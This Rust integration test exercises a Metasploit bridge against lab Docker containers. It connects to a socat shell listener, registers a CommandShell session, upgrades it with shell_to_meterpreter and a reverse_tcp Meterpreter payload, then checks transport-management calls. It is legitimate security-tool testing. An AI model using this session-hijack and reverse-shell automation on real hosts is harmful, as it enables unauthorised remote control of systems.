// =============================================================================
// Integration Test: Meterpreter Transport Management
// =============================================================================
//
// This test CREATES a Meterpreter session by:
// 1. Connecting to the socat shell listener on target-linux:4445
// 2. Registering it as a CommandShell session
// 3. Upgrading to Meterpreter via shell_to_meterpreter post module
// 4. Testing Transport Management operations
//
// Run with:
//   docker compose -f docker/docker-compose.yml run --rm integration-test \
//     cargo test --manifest-path rust/bridge/Cargo.toml --test test_transport -- --nocapture
//
// IMPORTANT: This test requires the target-linux container to be running.
// The test will FAIL if it cannot create a Meterpreter session.
//
// =============================================================================

mod common;

use bridge::ruby_bridge;
use magnus::{value::ReprValue, Ruby, TryConvert, Value};
use std::{thread, time::Duration};

// =============================================================================
// Helper Functions
// =============================================================================

/// Get current session IDs from the framework
fn get_session_ids(framework: Value) -> Vec<i64> {
    let sessions =
        ruby_bridge::call_method(framework, "sessions", &[]).expect("Failed to get sessions");
    let session_keys =
        ruby_bridge::call_method(sessions, "keys", &[]).expect("Failed to get session keys");
    TryConvert::try_convert(session_keys).unwrap_or_else(|_| Vec::new())
}

/// Wait for a new session to appear (returns session ID or None)
fn wait_for_new_session(
    framework: Value,
    existing_sessions: &[i64],
    timeout_secs: u64,
) -> Option<i64> {
    for attempt in 0..timeout_secs {
        thread::sleep(Duration::from_secs(1));

        let current_sessions = get_session_ids(framework);
        for sid in &current_sessions {
            if !existing_sessions.contains(sid) {
                return Some(*sid);
            }
        }

        if attempt % 10 == 0 && attempt > 0 {
            println!("      Waiting for session... ({}s)", attempt);
        }
    }
    None
}

/// Wait for a Meterpreter session specifically
fn wait_for_meterpreter_session(
    ruby: &Ruby,
    framework: Value,
    existing_sessions: &[i64],
    timeout_secs: u64,
) -> Option<(i64, Value)> {
    let sessions_manager =
        ruby_bridge::call_method(framework, "sessions", &[]).expect("Failed to get sessions");

    for attempt in 0..timeout_secs {
        thread::sleep(Duration::from_secs(1));

        let current_sessions = get_session_ids(framework);
        for sid in &current_sessions {
            if existing_sessions.contains(sid) {
                continue;
            }

            // Check if it's a Meterpreter session
            let sid_val = ruby.integer_from_i64(*sid).as_value();
            let session_val = ruby_bridge::call_method(sessions_manager, "[]", &[sid_val])
                .expect("Failed to get session");

            let type_val = ruby_bridge::call_method(session_val, "type", &[])
                .expect("Failed to get type");
            let session_type = ruby_bridge::value_to_string(type_val).unwrap_or_default();

            if session_type.to_lowercase().contains("meterpreter") {
                return Some((*sid, session_val));
            }
        }

        if attempt % 15 == 0 && attempt > 0 {
            println!("      Waiting for Meterpreter session... ({}s)", attempt);
        }
    }
    None
}

/// Kill a session and ignore errors
fn kill_session(session: Value) {
    let _ = ruby_bridge::call_method(session, "kill", &[]);
}

/// Create a shell session by connecting to the socat listener
fn create_shell_session(ruby: &Ruby, framework: Value, host: &str, port: u16) -> Result<(i64, Value), String> {
    let sessions_before = get_session_ids(framework);

    // Get Rex::Socket::Tcp class
    let rex_socket_tcp = ruby
        .eval::<Value>("Rex::Socket::Tcp")
        .map_err(|e| format!("Failed to get Rex::Socket::Tcp: {}", e))?;

    // Build options hash
    let opts = ruby.hash_new().as_value();
    let peer_host_key = ruby.str_new("PeerHost").as_value();
    let peer_host_val = ruby.str_new(host).as_value();
    ruby_bridge::call_method(opts, "[]=", &[peer_host_key, peer_host_val])
        .map_err(|e| format!("Failed to set PeerHost: {}", e))?;

    let peer_port_key = ruby.str_new("PeerPort").as_value();
    let peer_port_val = ruby.integer_from_i64(port as i64).as_value();
    ruby_bridge::call_method(opts, "[]=", &[peer_port_key, peer_port_val])
        .map_err(|e| format!("Failed to set PeerPort: {}", e))?;

    let timeout_key = ruby.str_new("Timeout").as_value();
    let timeout_val = ruby.integer_from_i64(10).as_value();
    ruby_bridge::call_method(opts, "[]=", &[timeout_key, timeout_val])
        .map_err(|e| format!("Failed to set Timeout: {}", e))?;

    // Create socket connection
    let socket = ruby_bridge::call_method(rex_socket_tcp, "create", &[opts])
        .map_err(|e| format!("Failed to create socket: {}", e))?;

    if socket.is_nil() {
        return Err("Socket connection failed".to_string());
    }

    // Create CommandShell session
    let cmd_shell_class = ruby
        .eval::<Value>("Msf::Sessions::CommandShell")
        .map_err(|e| format!("Failed to get CommandShell class: {}", e))?;

    let session = ruby_bridge::call_method(cmd_shell_class, "new", &[socket])
        .map_err(|e| format!("Failed to create CommandShell: {}", e))?;

    // Set platform and arch for shell_to_meterpreter compatibility
    let platform_val = ruby.str_new("linux").as_value();
    ruby_bridge::call_method(session, "platform=", &[platform_val])
        .map_err(|e| format!("Failed to set platform: {}", e))?;

    let arch_val = ruby.str_new("x64").as_value();
    ruby_bridge::call_method(session, "arch=", &[arch_val])
        .map_err(|e| format!("Failed to set arch: {}", e))?;

    // Set empty exploit_datastore
    let empty_hash = ruby.hash_new().as_value();
    ruby_bridge::call_method(session, "exploit_datastore=", &[empty_hash])
        .map_err(|e| format!("Failed to set exploit_datastore: {}", e))?;

    // Register session with framework
    let sessions_manager = ruby_bridge::call_method(framework, "sessions", &[])
        .map_err(|e| format!("Failed to get sessions: {}", e))?;

    ruby_bridge::call_method(sessions_manager, "register", &[session])
        .map_err(|e| format!("Failed to register session: {}", e))?;

    // Wait for session to be registered
    thread::sleep(Duration::from_millis(500));

    let session_id = wait_for_new_session(framework, &sessions_before, 5)
        .ok_or_else(|| "Session not registered".to_string())?;

    Ok((session_id, session))
}

/// Upgrade a shell session to Meterpreter
fn upgrade_to_meterpreter(
    ruby: &Ruby,
    framework: Value,
    shell_session: Value,
    shell_session_id: i64,
    lhost: &str,
    lport: u16,
) -> Result<(i64, Value), String> {
    let sessions_before = get_session_ids(framework);

    println!("   Upgrading shell {} to Meterpreter (LHOST={}, LPORT={})",
             shell_session_id, lhost, lport);

    // Create the shell_to_meterpreter post module
    let modules = ruby_bridge::call_method(framework, "modules", &[])
        .map_err(|e| format!("Failed to get modules: {}", e))?;

    let module_name = ruby.str_new("post/multi/manage/shell_to_meterpreter").as_value();
    let module = ruby_bridge::call_method(modules, "create", &[module_name])
        .map_err(|e| format!("Failed to create post module: {}", e))?;

    if module.is_nil() {
        return Err("shell_to_meterpreter module not found".to_string());
    }

    // Configure the module
    let datastore = ruby_bridge::call_method(module, "datastore", &[])
        .map_err(|e| format!("Failed to get datastore: {}", e))?;

    // Set SESSION
    let session_key = ruby.str_new("SESSION").as_value();
    let session_val = ruby.integer_from_i64(shell_session_id).as_value();
    ruby_bridge::call_method(datastore, "[]=", &[session_key, session_val])
        .map_err(|e| format!("Failed to set SESSION: {}", e))?;

    // Set LHOST
    let lhost_key = ruby.str_new("LHOST").as_value();
    let lhost_val = ruby.str_new(lhost).as_value();
    ruby_bridge::call_method(datastore, "[]=", &[lhost_key, lhost_val])
        .map_err(|e| format!("Failed to set LHOST: {}", e))?;

    // Set LPORT
    let lport_key = ruby.str_new("LPORT").as_value();
    let lport_val = ruby.str_new(&lport.to_string()).as_value();
    ruby_bridge::call_method(datastore, "[]=", &[lport_key, lport_val])
        .map_err(|e| format!("Failed to set LPORT: {}", e))?;

    // Set HANDLER=true
    let handler_key = ruby.str_new("HANDLER").as_value();
    let handler_val = ruby.str_new("true").as_value();
    ruby_bridge::call_method(datastore, "[]=", &[handler_key, handler_val])
        .map_err(|e| format!("Failed to set HANDLER: {}", e))?;

    // Force x64 Meterpreter to get full transport support
    // MSF's shell_to_meterpreter has a bug where /86/ matches both x86 and x86_64
    let payload_key = ruby.str_new("PAYLOAD_OVERRIDE").as_value();
    let payload_val = ruby.str_new("linux/x64/meterpreter/reverse_tcp").as_value();
    ruby_bridge::call_method(datastore, "[]=", &[payload_key, payload_val])
        .map_err(|e| format!("Failed to set PAYLOAD_OVERRIDE: {}", e))?;

    let platform_key = ruby.str_new("PLATFORM_OVERRIDE").as_value();
    let platform_val = ruby.str_new("linux").as_value();
    ruby_bridge::call_method(datastore, "[]=", &[platform_key, platform_val])
        .map_err(|e| format!("Failed to set PLATFORM_OVERRIDE: {}", e))?;

    println!("   Using x64 Meterpreter payload (PAYLOAD_OVERRIDE)");

    // Setup and run the module
    ruby_bridge::call_method(module, "setup", &[])
        .map_err(|e| format!("Failed to setup module: {}", e))?;

    let _ = ruby_bridge::call_method(module, "run", &[]);

    // Cleanup module
    let _ = ruby_bridge::call_method(module, "cleanup", &[]);

    // Wait for Meterpreter session
    println!("   Waiting for Meterpreter session...");
    let (meterpreter_id, meterpreter_session) =
        wait_for_meterpreter_session(ruby, framework, &sessions_before, 90)
            .ok_or_else(|| "Meterpreter session did not connect within timeout".to_string())?;

    println!("   ✓ Got Meterpreter session: {}", meterpreter_id);

    Ok((meterpreter_id, meterpreter_session))
}

// =============================================================================
// Main Integration Test
// =============================================================================

#[test]
fn it_tests_meterpreter_transport_management() {
    // Check if we're in integration environment
    let env = match common::require_integration_env() {
        Some(env) => env,
        None => return,
    };

    println!("\n{}", "=".repeat(60));
    println!(" Integration Test: Meterpreter Transport Management");
    println!("{}\n", "=".repeat(60));

    let (ruby, framework) = common::init_framework();

    // Get LHOST for handler - use container's IP
    let lhost = std::env::var("LHOST").unwrap_or_else(|_| {
        // Auto-detect container IP
        std::process::Command::new("hostname")
            .arg("-I")
            .output()
            .ok()
            .and_then(|o| String::from_utf8(o.stdout).ok())
            .map(|s| s.split_whitespace().next().unwrap_or("127.0.0.1").to_string())
            .unwrap_or_else(|| "127.0.0.1".to_string())
    });
    let lport: u16 = std::env::var("LPORT")
        .ok()
        .and_then(|s| s.parse().ok())
        .unwrap_or(4433);

    println!("🎯 Test Configuration:");
    println!("   Target: {}:{}", env.target_host, env.shell_port);
    println!("   Handler: {}:{}", lhost, lport);

    // Step 1: Create shell session
    println!("\n📍 Step 1: Creating shell session...");
    let (shell_session_id, shell_session) = match create_shell_session(
        &ruby,
        framework,
        &env.target_host,
        env.shell_port
    ) {
        Ok(result) => result,
        Err(e) => {
            panic!("❌ Failed to create shell session: {}", e);
        }
    };
    println!("   ✓ Shell session created: {}", shell_session_id);

    // Step 2: Upgrade to Meterpreter
    println!("\n📍 Step 2: Upgrading to Meterpreter...");
    let (meterpreter_id, meterpreter_session) = match upgrade_to_meterpreter(
        &ruby,
        framework,
        shell_session,
        shell_session_id,
        &lhost,
        lport,
    ) {
        Ok(result) => result,
        Err(e) => {
            // Cleanup shell session before failing
            kill_session(shell_session);
            panic!("❌ Failed to upgrade to Meterpreter: {}", e);
        }
    };

    // Create Session wrapper for testing
    let session = bridge::Session::from_raw(meterpreter_session, meterpreter_id);

    // Step 3: Test Transport Management operations
    println!("\n📍 Step 3: Testing Transport Management...");

    // Get session platform and arch
    let session_platform = {
        let platform_val = ruby_bridge::call_method(meterpreter_session, "platform", &[])
            .expect("Failed to get platform");
        ruby_bridge::value_to_string(platform_val).unwrap_or_default()
    };
    let session_arch = {
        let arch_val = ruby_bridge::call_method(meterpreter_session, "arch", &[])
            .expect("Failed to get arch");
        ruby_bridge::value_to_string(arch_val).unwrap_or_default()
    };
    println!("   Session platform: {}", session_platform);
    println!("   Session architecture: {}", session_arch);

    // IMPORTANT: Transport Management is Windows-only in Meterpreter
    // Linux Meterpreter (x86 AND x64) does NOT support transport operations
    let is_windows = session_platform.to_lowercase().contains("windows")
        || session_platform.to_lowercase().contains("win");

    if !is_windows {
        println!("\n⚠ NOTE: Transport Management is Windows-only");
        println!("  Linux Meterpreter does NOT support transport operations.");
        println!("  Use target-windows container for full transport testing.");
        println!("  Testing transport_sleep(0) which works on all platforms...\n");

        // Test transport_sleep(0) - this works on all platforms
        // because our Rust implementation short-circuits without calling MSF
        println!("--- Testing transport_sleep(0) ---");
        let sleep_result = session.transport_sleep(0)
            .expect("transport_sleep(0) should succeed on all platforms");
        println!("✓ transport_sleep(0) = {}", sleep_result);
        assert!(!sleep_result, "Sleep(0) should return false");

        println!("\n📝 Transport tests completed (Linux - limited support)");
        println!("   ✓ transport_sleep(0) works (handled in Rust)");
        println!("   ⚠ Other transport ops require Windows Meterpreter");
    } else {
        // Windows Meterpreter - full transport support
        println!("\n✓ Windows Meterpreter detected - full transport support available");

        // Test 3a: transport_list
        println!("\n--- Testing transport_list ---");
        let transport_info = session.transport_list()
            .expect("transport_list() should succeed on Windows Meterpreter");

        println!("✓ transport_list() returned successfully");
        println!("  Result: {}", transport_info);

        assert!(transport_info.get("session_exp").is_some(), "Should have session_exp");
        assert!(transport_info.get("transports").is_some(), "Should have transports");

        if let Some(transports) = transport_info.get("transports").and_then(|t| t.as_array()) {
            println!("  Transport count: {}", transports.len());
            assert!(!transports.is_empty(), "Should have at least one transport");

            for (i, t) in transports.iter().enumerate() {
                if let Some(url) = t.get("url") {
                    println!("  Transport {}: {}", i, url);
                }
            }
        }

        // Test 3b: set_transport_timeouts
        println!("\n--- Testing set_transport_timeouts ---");
        let timeouts = session.set_transport_timeouts(None, None, None, None)
            .expect("set_transport_timeouts() should succeed on Windows Meterpreter");
        println!("✓ set_transport_timeouts() returned successfully");
        println!("  Result: {}", timeouts);

        // Test 3c: transport_sleep with 0
        println!("\n--- Testing transport_sleep(0) ---");
        let sleep_result = session.transport_sleep(0)
            .expect("transport_sleep(0) should succeed");
        println!("✓ transport_sleep(0) = {}", sleep_result);
        assert!(!sleep_result, "Sleep(0) should return false");

        println!("\n--- Skipping destructive transport tests ---");
        println!("⚠ Skipping transport_add/remove/change/next/prev - would alter session");
    }

    // Cleanup
    println!("\n📍 Step 4: Cleanup...");
    kill_session(meterpreter_session);
    // The shell session may have been killed by the upgrade, but try anyway
    let _ = kill_session(shell_session);

    println!("\n{}", "=".repeat(60));
    println!(" ✅ Transport Management Test PASSED");
    println!("{}\n", "=".repeat(60));
}
